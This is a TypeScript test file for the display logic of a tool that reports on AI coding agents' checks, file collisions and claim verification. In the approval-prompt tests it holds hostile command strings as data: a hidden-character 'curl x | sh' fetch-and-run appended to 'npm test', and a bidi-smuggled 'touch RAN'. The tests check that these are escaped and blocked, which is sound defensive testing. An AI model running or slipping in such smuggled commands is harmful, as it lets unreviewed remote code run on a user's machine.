import { describe, expect, it } from "vitest";
import { approvalPrompt, boardSummary, checkProvenance, claimLine, footerSummary, canOpenInDocViewer, checkRan, collisionLabel, docViewerEnabled, docViewerFor, latestPerAgent, overallTone, proofFacts, verifyLabel } from "../client/format";
import { CHECK_ALREADY_RUNNING, NOT_A_GIT_REPOSITORY, type TurnReport, type Verdict } from "../shared/report";

function report(id: string, agentId: string, patch: { verify?: Partial<TurnReport["verify"]>; collisions?: Partial<TurnReport["collisions"]>; verdicts?: Verdict[] } = {}): TurnReport {
  return {
    id, agentId, agentTitle: agentId, workspaceId: "w", turnId: id, cwd: "/r", branch: "main", startedAt: null, endedAt: "2026-10-17T22:00:00.000Z",
    verify: { state: "passed", command: "npm test", exitCode: 0, durationMs: 10, tail: "", attempt: 1, maxAttempts: 1, note: null, ...patch.verify },
    collisions: { state: "done", peersChecked: 1, items: [], durationMs: 5, note: null, ...patch.collisions },
    artifacts: { state: "done", items: [], more: 0, note: null },
    proof: patch.verdicts
      ? {
          provider: "claude", commands: [], commandsTotal: 0, failedTools: [], deniedTools: [], files: [], testFiles: [], lastEditIndex: null,
          check: { command: "npm test", agentRan: null, pluginPassed: true },
          claims: patch.verdicts.map((verdict) => ({ kind: "fixed" as const, text: "Fixed.", verdict, reason: "r" })),
        }
      : null,
  };
}

const conflict = { agentId: "b", agentTitle: "beta", branch: "b", files: [{ path: "math.js", kind: "content" }, { path: "notes.md", kind: "add/add" }], moreFiles: 0 };

describe("documents next to the doc viewer", () => {
  it("leaves the file list to the doc viewer only when its plugin is configured and enabled", () => {
    const viewer = { source: "directory" as const, path: "/plugins/doc-viewer" };
    const id = "paseo-doc-viewer";
    expect(docViewerEnabled({ pluginsEnabled: true, plugins: { [id]: viewer } }, id)).toBe(true);
    expect(docViewerEnabled({ pluginsEnabled: true, plugins: { [id]: { ...viewer, enabled: false } } }, id)).toBe(false);
    expect(docViewerEnabled({ pluginsEnabled: false, plugins: { [id]: viewer } }, id)).toBe(false);
    expect(docViewerEnabled({ pluginsEnabled: true, plugins: {} }, id)).toBe(false);
    expect(docViewerEnabled({ pluginsEnabled: true, plugins: { [id]: viewer } }, "")).toBe(false);
  });

  it("offers Open only when the doc viewer is on, never into a disabled or unknown plugin", () => {
    const settings = { openWithPluginId: "paseo-doc-viewer" };
    expect(docViewerFor(settings, "srv", "on")).toBe("paseo-doc-viewer");
    expect(docViewerFor(settings, "srv", "off")).toBeNull();
    expect(docViewerFor(settings, "srv", "unknown")).toBeNull();
    expect(docViewerFor({ openWithPluginId: "" }, "srv", "on")).toBeNull();
    expect(docViewerFor(settings, "", "on")).toBeNull();
    expect(docViewerFor(null, "srv", "on")).toBeNull();
  });

  it("offers Open only for file types the doc viewer renders", () => {
    for (const path of ["out/report.pdf", "a.docx", "b.xlsx", "c.csv", "d.pptx", "e.png", "f.JPG", "g.jpeg", "h.gif", "i.webp", "log.jsonl"]) expect(canOpenInDocViewer(path)).toBe(true);
    for (const path of ["out/chart.svg", "nb.ipynb", "README", "dir.pdf/notes.txt"]) expect(canOpenInDocViewer(path)).toBe(false);
  });
});

describe("check section", () => {
  it("offers Re-run whenever a check ran, with or without output", () => {
    expect(["passed", "failed", "gave_up", "busy", "retrying"].map((state) => checkRan(state as TurnReport["verify"]["state"]))).toEqual([true, true, true, true, true]);
    expect(["skipped", "needs_approval", "running"].map((state) => checkRan(state as TurnReport["verify"]["state"]))).toEqual([false, false, false]);
  });
});

describe("board", () => {
  it("counts the latest report per agent, once each, by its tone", () => {
    const reports = [
      report("3", "a", { verify: { state: "failed", exitCode: 1 } }),
      report("2", "b", { collisions: { items: [conflict] } }),
      report("1", "a"), // older, ignored
      report("0", "c", { verify: { state: "skipped", command: null } }),
      report("-1", "d"),
    ];
    expect(latestPerAgent(reports).map((r) => r.id)).toEqual(["3", "2", "0", "-1"]);
    expect(boardSummary(reports)).toMatchObject({ green: 1, amber: 1, red: 1, other: 1, text: "1 green, 1 amber, 1 red, 1 unchecked" });
  });

  it("a red check outranks a collision", () => {
    expect(overallTone(report("x", "a", { verify: { state: "gave_up" }, collisions: { items: [conflict] } }))).toBe("danger");
  });

  it("takes the worst of check, collisions and proof", () => {
    // T4b-like: the plugin check passed, but the agent's own record contradicts its claim.
    expect(overallTone(report("x", "a", { verdicts: ["verified", "contradicted"] }))).toBe("danger");
    expect(overallTone(report("x", "a", { verdicts: ["unsupported"] }))).toBe("warning");
    expect(overallTone(report("x", "a", { verify: { state: "skipped", command: null }, verdicts: ["unsupported"] }))).toBe("warning");
    expect(overallTone(report("x", "a", { verdicts: ["checked", "unchecked"] }))).toBe("success");
    expect(overallTone(report("x", "a", { verify: { state: "failed" }, verdicts: ["unsupported"] }))).toBe("danger");
    // A claim judged before the check finished waits for it; a contradiction does not.
    expect(overallTone(report("x", "a", { verify: { state: "running" }, verdicts: ["unsupported"] }))).toBe("muted");
    expect(overallTone(report("x", "a", { verify: { state: "running" }, verdicts: ["contradicted"] }))).toBe("danger");
    const board = [report("1", "a", { verdicts: ["contradicted"] }), report("2", "b", { verdicts: ["mismatch"] }), report("3", "c", { verdicts: ["verified"] })];
    expect(boardSummary(board)).toMatchObject({ green: 1, amber: 1, red: 1, other: 0 });
  });

  it("says collisions need a git repository, and a check skipped for a running one is busy", () => {
    expect(collisionLabel(report("x", "a", { collisions: { state: "skipped", peersChecked: 0, note: NOT_A_GIT_REPOSITORY } }))).toBe("Collisions need a git repository");
    expect(collisionLabel(report("x", "a", { collisions: { state: "skipped", peersChecked: 0, note: null } }))).toBe("Collisions off");
    expect(verifyLabel(report("x", "a", { verify: { state: "skipped", command: "npm test", exitCode: null, note: CHECK_ALREADY_RUNNING } }))).toBe("Check busy");
    expect(verifyLabel(report("x", "a", { verify: { state: "skipped", command: null, exitCode: null, note: "verify is off in settings" } }))).toBe("No check");
  });

  it("labels are glanceable", () => {
    expect(verifyLabel(report("x", "a", { verify: { state: "retrying", attempt: 1, maxAttempts: 3 } }))).toBe("Check failed (1/3), sent to agent");
    expect(verifyLabel(report("x", "a", { verify: { state: "failed", attempt: 1, maxAttempts: 1 } }))).toBe("Check failed");
    expect(collisionLabel(report("x", "a", { collisions: { items: [conflict] } }))).toBe("2 files conflict with beta");
    expect(collisionLabel(report("x", "a", { collisions: { peersChecked: 0 } }))).toBe("No other agents");
  });

  it("counts one shell call once when it contains both a build and a test", () => {
    const proof = report("r", "a", { verdicts: ["unsupported"] }).proof!;
    proof.commandsTotal = 1;
    proof.commands = ["build", "test"].map((kind) => ({ command: "npm run build && npm test", kind: kind as "build" | "test", index: 2, exitCode: null, outcome: "unknown" }));
    expect(proofFacts(proof)).toBe("1 command, 1 exit unknown · 0 files written");
  });
});

describe("check approval", () => {
  it("shows a command with hidden characters escaped and offers no approval", () => {
    const verify = (command: string) => report("r", "a", { verify: { state: "needs_approval", command, exitCode: null } }).verify;
    expect(approvalPrompt(verify("npm test"))).toEqual({ command: "npm test", approvable: true, warning: null });
    expect(approvalPrompt(verify("npm test\u001b[8m; curl x | sh"))).toEqual({
      command: "npm test\\u001B[8m; curl x | sh",
      approvable: false,
      warning: "This command has hidden characters (control, zero-width or bidi), shown escaped. Fix paseo.json: it cannot be approved.",
    });
    expect(approvalPrompt(verify("npm\u200b test #\u202e\u2066x\u{E0041}")).command).toBe("npm\\u200B test #\\u202E\\u2066x\\u{E0041}");
    // Tabs and new lines are visible: a multi-line command can be approved.
    expect(approvalPrompt(verify("npm run build\n\tnpm test")).approvable).toBe(true);
  });

  it("warns that a check whose exit status is not a run's own will not count as proof (review N1)", () => {
    const verify = (command: string) => report("r", "a", { verify: { state: "needs_approval", command, exitCode: null } }).verify;
    const warning = "This command can hide failures or does not run a recognized check. Its exit status alone will not verify the agent's claims.";
    for (const command of ["npm test | tail -5", "npm test || true", "npm test; echo done", "jest --listTests", "make ci"]) {
      expect([command, approvalPrompt(verify(command))]).toEqual([command, { command, approvable: true, warning }]);
    }
    for (const command of ["npm test", "npm run build && npm test", "set -o pipefail; npm test | tail -5"]) {
      expect([command, approvalPrompt(verify(command)).warning]).toEqual([command, null]);
    }
  });

  it("says when the agent's run of the check was in another directory", () => {
    const { proof } = report("r", "a", { verdicts: ["unsupported"] });
    const check = { ...proof!, check: { command: "npm test", agentRan: { exitCode: null, outcome: "elsewhere" as const }, pluginPassed: null } };
    expect(checkProvenance(check, "skipped")).toBe("npm test: agent ran it in another directory; plugin check skipped");
  });

  it("escapes hidden characters wherever the card quotes a command: the check line and claim reasons", () => {
    const command = "npm test\u202e; touch RAN";
    const { proof } = report("r", "a", { verdicts: ["unsupported"] });
    const check = { ...proof!, check: { command, agentRan: null, pluginPassed: null } };
    expect(checkProvenance(check, "needs_approval")).toBe("npm test\\u202E; touch RAN: agent did not run it; plugin check needs approval");
    const line = claimLine({ ...proof!.claims[0]!, reason: "last test command failed: npm\u200b test (exit 1)" });
    expect(line).toContain("npm\\u200B test (exit 1)");
    expect(line).not.toMatch(/\u200b/);
  });
});

describe("sidebar footer", () => {
  it("shows the most urgent non-empty count, unchecked included, never 0 green", () => {
    const red = report("r", "a", { verify: { state: "failed", exitCode: 1 } });
    const amber = report("m", "b", { collisions: { items: [conflict] } });
    const unchecked = report("u", "c", { verify: { state: "skipped", command: null, exitCode: null } });
    const green = report("g", "d");
    expect(footerSummary([])).toBeNull();
    expect(footerSummary([unchecked, { ...unchecked, id: "u2", agentId: "e" }])).toEqual({ text: "2 unchecked", tone: "muted" });
    expect(footerSummary([green, unchecked])).toEqual({ text: "1 unchecked", tone: "muted" });
    expect(footerSummary([green, amber, unchecked])).toEqual({ text: "1 amber", tone: "warning" });
    expect(footerSummary([green, amber, red])).toEqual({ text: "1 red", tone: "danger" });
    expect(footerSummary([green, { ...green, id: "g2", agentId: "f" }])).toEqual({ text: "2 green", tone: "success" });
  });
});
